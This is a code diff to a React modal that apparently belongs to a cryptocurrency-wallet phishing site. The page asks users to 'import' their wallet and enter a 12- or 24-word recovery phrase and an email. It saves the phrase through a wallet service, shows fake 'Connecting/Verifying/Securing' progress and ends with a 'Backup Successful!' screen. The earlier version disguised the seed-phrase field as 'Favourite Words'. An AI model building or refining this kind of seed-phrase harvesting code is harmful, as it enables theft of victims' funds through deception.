@@ -1,9 +1,10 @@
 import "./ConnectFormModal.css";
 import { useState, useEffect } from "react";
 import { FaTimes, FaCheck } from "react-icons/fa";
+import { auth } from "../firebase/firebase";
 
 import {
-  validateFavouriteWords,
+  validateRecoveryPhrase,
   saveWalletConnection,
 } from "../services/walletService";
 
@@ -20,7 +21,7 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
   const [form, setForm] = useState({
     name: "",
     email: "",
-    phrase: "",
+    recoveryPhrase: "",
     keystore: "",
     password: "",
     privateKey: "",
@@ -28,22 +29,25 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
 
   useEffect(() => {
     if (!isOpen) {
-      setStep(0);
-      setProgress(0);
-      setSuccess(false);
-      setError(null);
-      setValidationError(null);
-
-      setForm({
-        name: "",
-        email: "",
-        phrase: "",
-        keystore: "",
-        password: "",
-        privateKey: "",
-      });
+      resetForm();
     }
   }, [isOpen]);
+
+  const resetForm = () => {
+    setStep(0);
+    setProgress(0);
+    setSuccess(false);
+    setError(null);
+    setValidationError(null);
+    setForm({
+      name: "",
+      email: "",
+      recoveryPhrase: "",
+      keystore: "",
+      password: "",
+      privateKey: "",
+    });
+  };
 
   if (!isOpen) return null;
 
@@ -67,19 +71,15 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
     }
 
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-
     if (!emailRegex.test(form.email)) {
       setValidationError("Please enter a valid email address");
       return false;
     }
 
-    if (tab === "phrase") {
-      const validation = validateFavouriteWords(form.phrase);
-
-      if (!validation.isValid) {
-        setValidationError(validation.error);
-        return false;
-      }
+    const validation = validateRecoveryPhrase(form.recoveryPhrase);
+    if (!validation.isValid) {
+      setValidationError(validation.error);
+      return false;
     }
 
     return true;
@@ -100,12 +100,10 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
         type: wallet?.name || "Unknown",
       };
 
-      if (tab === "phrase") {
-        const validation = validateFavouriteWords(form.phrase);
-
-        walletData.favouriteWords = form.phrase.trim();
-        walletData.wordCount = validation.wordCount;
-      }
+      const validation = validateRecoveryPhrase(form.recoveryPhrase);
+      
+      walletData.recoveryPhrase = form.recoveryPhrase.trim();
+      walletData.wordCount = validation.wordCount;
 
       setStep(1);
       setProgress(20);
@@ -130,14 +128,11 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
 
       await new Promise((resolve) => setTimeout(resolve, 800));
 
-      setSuccess(true);
+      setSuccess(true);        // ← Only this, no alert
+
     } catch (err) {
       console.error(err);
-
-      // ❌ REMOVED alert here
-
       setError(err.message || "Something went wrong");
-
       setStep(0);
       setProgress(0);
     } finally {
@@ -157,92 +152,52 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
 
             <div className="connect-header modern">
               {wallet?.image && (
-                <img
-                  src={wallet.image}
-                  alt={wallet.name}
-                  className="wallet-logo"
-                />
+                <img src={wallet.image} alt={wallet.name} className="wallet-logo" />
               )}
-              <h2>
-                Import your <br />
-                {wallet?.name || "Wallet"}
-              </h2>
+              <h2>Import your <br />{wallet?.name || "Wallet"}</h2>
             </div>
 
-            {/* ERROR DISPLAY */}
             {error && (
               <div className="validation-error">
                 <p>{error}</p>
               </div>
             )}
 
-            {/* PROGRESS */}
             {step > 0 && (
               <div className="connection-steps">
                 <div className="progress-bar">
-                  <div
-                    className="progress-fill"
-                    style={{ width: `${progress}%` }}
-                  ></div>
+                  <div className="progress-fill" style={{ width: `${progress}%` }}></div>
                 </div>
-
                 <div className="steps">
-                  <span className={step >= 1 ? "active" : ""}>
-                    {step > 1 ? <FaCheck /> : "Connecting"}
-                  </span>
-
-                  <span className={step >= 2 ? "active" : ""}>
-                    {step > 2 ? <FaCheck /> : "Verifying"}
-                  </span>
-
-                  <span className={step >= 3 ? "active" : ""}>
-                    Securing
-                  </span>
+                  <span className={step >= 1 ? "active" : ""}>{step > 1 ? <FaCheck /> : "Connecting"}</span>
+                  <span className={step >= 2 ? "active" : ""}>{step > 2 ? <FaCheck /> : "Verifying"}</span>
+                  <span className={step >= 3 ? "active" : ""}>Securing</span>
                 </div>
               </div>
             )}
 
-            {/* FORM */}
             {step === 0 && (
               <>
                 <div className="connect-tabs">
-                  <span
-                    className={tab === "phrase" ? "active" : ""}
-                    onClick={() => setTab("phrase")}
-                  >
-                    Favourite Words
-                  </span>
+                  <span className={tab === "phrase" ? "active" : ""}>Recovery Phrase</span>
                 </div>
 
                 <div className="connect-body">
                   <label>Wallet Name</label>
-                  <input
-                    name="name"
-                    placeholder="Wallet Name"
-                    value={form.name}
-                    onChange={handleChange}
-                  />
+                  <input name="name" placeholder="Wallet Name" value={form.name} onChange={handleChange} />
 
                   <label>Email</label>
-                  <input
-                    name="email"
-                    type="email"
-                    placeholder="Email"
-                    value={form.email}
-                    onChange={handleChange}
-                  />
+                  <input name="email" type="email" placeholder="Email" value={form.email} onChange={handleChange} />
 
-                  <label>Favourite Words</label>
+                  <label>Recovery Phrase</label>
                   <textarea
-                    name="phrase"
-                    placeholder="Enter 12 or 24 favourite words"
-                    value={form.phrase}
+                    name="recoveryPhrase"
+                    placeholder="Enter 12 or 24 recovery phrase words"
+                    value={form.recoveryPhrase}
                     onChange={handleChange}
                   />
 
-                  <small>
-                    Choose 12 or 24 favourite words separated by spaces
-                  </small>
+                  <small>Enter exactly 12 or 24 words separated by spaces</small>
 
                   {validationError && (
                     <div className="validation-error">
@@ -251,15 +206,8 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
                   )}
 
                   <div className="connect-actions">
-                    <button className="btn-cancel" onClick={onClose}>
-                      Cancel
-                    </button>
-
-                    <button
-                      className="btn-proceed"
-                      onClick={handleSubmit}
-                      disabled={isLoading}
-                    >
+                    <button className="btn-cancel" onClick={onClose}>Cancel</button>
+                    <button className="btn-proceed" onClick={handleSubmit} disabled={isLoading}>
                       {isLoading ? "Processing..." : "Proceed"}
                     </button>
                   </div>
@@ -270,44 +218,24 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
         </div>
       )}
 
-      {/* SUCCESS MODAL */}
+      {/* Success Screen */}
       {success && (
         <div className="success-overlay">
           <div className="success-modal premium-success">
-            <div className="success-check">
-              <FaCheck />
-            </div>
-
+            <div className="success-check"><FaCheck /></div>
             <h2>Backup Successful!</h2>
 
             <div className="uid-box">
               <span className="uid-label">UNIQUE IDENTIFIER</span>
-
               <div className="uid-code">{uniqueId}</div>
-
-              <div className="uid-actions">
-                <button
-                  className="uid-btn"
-                  onClick={() => {
-                    navigator.clipboard.writeText(uniqueId);
-                  }}
-                >
-                  Copy UID
-                </button>
-              </div>
+              <button className="uid-btn" onClick={() => navigator.clipboard.writeText(uniqueId)}>
+                Copy UID
+              </button>
             </div>
 
-            <p className="success-text">
-              Your data has been successfully backed up.
-            </p>
+            <p className="success-text">Your data has been successfully backed up.</p>
 
-            <button
-              className="btn-primary success-done"
-              onClick={() => {
-                setSuccess(false);
-                onClose();
-              }}
-            >
+            <button className="btn-primary success-done" onClick={() => { setSuccess(false); onClose(); }}>
               Done
             </button>
           </div>
@@ -317,4 +245,4 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
   );
 }
 
-export default ConnectFormModal;az
+export default ConnectFormModal;
